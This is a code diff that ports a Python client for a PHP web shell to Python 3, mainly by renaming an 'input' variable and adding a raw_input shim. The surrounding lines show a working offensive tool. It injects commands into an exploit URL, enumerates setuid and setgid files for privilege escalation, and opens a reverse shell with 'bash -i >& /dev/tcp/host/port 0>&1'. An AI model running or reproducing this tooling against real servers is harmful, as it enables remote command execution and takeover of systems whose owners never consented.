@@ -79,6 +79,11 @@ if ($_GET['cmd'] == '_show_phpinfo') {
 ############################################################
 ## Functions
 
+## support raw_input for python 3
+if (sys.version_info > (3, 0)):
+  def raw_input(prompt=None):
+    return input(prompt)
+
 def show_help(cmd=None):
   if cmd and cmd[0:1] == '.':
     cmd = cmd[1:]
@@ -194,7 +199,7 @@ def rev_shell(addr, port):
           sys.stdout.write(data)
           sys.stdout.flush()
       else:
-        msg = sys.stdin.readline()
+        msg = raw_input()
         conn.send(msg)
 
   conn.close()
@@ -242,12 +247,12 @@ while True:
   while revshell_running:
     time.sleep(0.1)
   exec_cmd = False
-  sys.stdout.write('>> ')
-  sys.stdout.flush()
-  input = sys.stdin.readline()
-  if not input:
+  #sys.stdout.write('>> ')
+  #sys.stdout.flush()
+  userinput = raw_input('>> ')
+  if not userinput:
     continue
-  cmd = input.split()
+  cmd = userinput.split()
   if cmd[0] == ".exit" or cmd[0] == ".quit":
     http_running = False
     if os.path.isfile(history_file):
@@ -255,7 +260,7 @@ while True:
     sys.exit(0)
   elif cmd[0] == ".auth":
     if len(cmd) > 1:
-      auth_user, auth_pass = input[len(cmd[0])+1:].split(":",1)
+      auth_user, auth_pass = userinput[len(cmd[0])+1:].split(":",1)
       auth = requests.auth.HTTPBasicAuth(auth_user, auth_pass)
     else:
       sys.stdout.write("[*] HTTP Auth: %s:%s\n" % (auth_user, auth_pass))
@@ -263,7 +268,7 @@ while True:
     if not len(cmd) >2:
       sys.stdout.write("[!] Invalid parameters\n")
       continue
-    cookies = json.loads(input[len(cmd[0])+1:])
+    cookies = json.loads(userinput[len(cmd[0])+1:])
   elif cmd[0] == ".encode":
     if len(cmd) != 2:
       sys.stdout.write("[!] Invalid parameters\n")
@@ -279,9 +284,9 @@ while True:
       continue
     exec_cmd = True
     if cmd[1] == "setgid":
-      input = "find / -type f -perm -02000 -ls"
+      userinput = "find / -type f -perm -02000 -ls"
     elif cmd[1] == "setuid":
-      input = "find / -type f -perm -04000 -ls"
+      userinput = "find / -type f -perm -04000 -ls"
     else:
       sys.stdout.write("[!] Invalid parameters\n")
       exec_cmd = False
@@ -354,17 +359,17 @@ while True:
         method = "get"
     sys.stdout.write("[*] HTTP method set: %s\n" % method.upper())
   elif cmd[0] == ".phpinfo":
-    input = "_show_phpinfo"
+    userinput = "_show_phpinfo"
     exec_cmd = True
   elif cmd[0] == ".post":
     if len(cmd) < 2:
       post = {}
     else:
-      post = json.loads(input[len(cmd[0])+1:])
+      post = json.loads(userinput[len(cmd[0])+1:])
     sys.stdout.write("[*] POST data set: %s\n" % post)
   elif cmd[0] == ".referer":
     if len(cmd) > 1:
-      headers['Referer'] = input[len(cmd[0])+1:]
+      headers['Referer'] = userinput[len(cmd[0])+1:]
     sys.stdout.write("[*] Referer set: %s\n" % headers['Referer'])
   elif cmd[0] == ".shell":
     if len(cmd) != 3:
@@ -374,7 +379,7 @@ while True:
     sys.stdout.write("[*] Initiating reverse shell...\n")
     host = cmd[1]
     port = cmd[2]
-    input = "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"
+    userinput = "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"
 
     # open our reverse shell in a new thread
     s = threading.Thread(target=rev_shell, args=(host, port))
@@ -386,20 +391,20 @@ while True:
     exec_cmd = True
   elif cmd[0] == ".url":
     if len(cmd) > 1:
-      url = input[len(cmd[0])+1:]
+      url = userinput[len(cmd[0])+1:]
     sys.stdout.write("[*] Exploit URL set: %s\n" % url)
   elif cmd[0] == ".useragent":
     if len(cmd) > 1:
-      headers['User-Agent'] = input[len(cmd[0])+1:]
+      headers['User-Agent'] = userinput[len(cmd[0])+1:]
     sys.stdout.write("[*] User-Agent set: %s\n" % headers['User-Agent'])
   else:
     exec_cmd = True
 
   if exec_cmd:
     if cmd_encode_b64:
-      cmd = base64.b64encode(input.encode()).decode()
+      cmd = base64.b64encode(userinput.encode()).decode()
     else:
-      cmd = re.sub('&', '%26', input)
+      cmd = re.sub('&', '%26', userinput)
       cmd = cmd.replace("\\", "\\\\")
     if '%CMD%' in url:
       query = re.sub('%CMD%', cmd.strip(), url)
@@ -426,7 +431,7 @@ while True:
         output = output[0]
       ## display our results
       sys.stdout.write(output + "\n")
-      if input == '_show_phpinfo':
+      if userinput == '_show_phpinfo':
         file = 'phpinfo.html'
         fp = open(file, 'w')
         fp.write(output)
